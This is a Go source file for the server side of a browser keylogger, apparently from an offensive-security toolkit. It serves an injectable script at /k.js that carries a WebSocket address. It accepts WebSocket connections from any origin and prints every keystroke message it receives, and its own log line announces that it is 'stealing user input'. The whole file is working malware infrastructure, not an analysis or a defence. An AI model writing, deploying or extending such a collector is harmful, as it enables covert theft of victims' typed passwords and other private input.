package keylogger

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
)

func init() {
	flag.StringVar(&listenAddr, "listen-address", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
	flag.Parse()
	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func ServWS(w http.ResponseWriter, r *http.Request) {
	log.Println("[*] WebSocket created, stealing user input.")
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}
	defer conn.Close()
	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}
		fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
	}
}

func ServeFile(w http.ResponseWriter, r *http.Request) {
	log.Println("[*] /k.js hit!")
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, wsAddr)
}

func WebInstance() {
	r := mux.NewRouter()
	r.HandleFunc("/ws", ServWS)
	r.HandleFunc("/k.js", ServeFile)
	log.Println("[*] Server starting")
	log.Fatal(http.ListenAndServe(":8080", r))
}
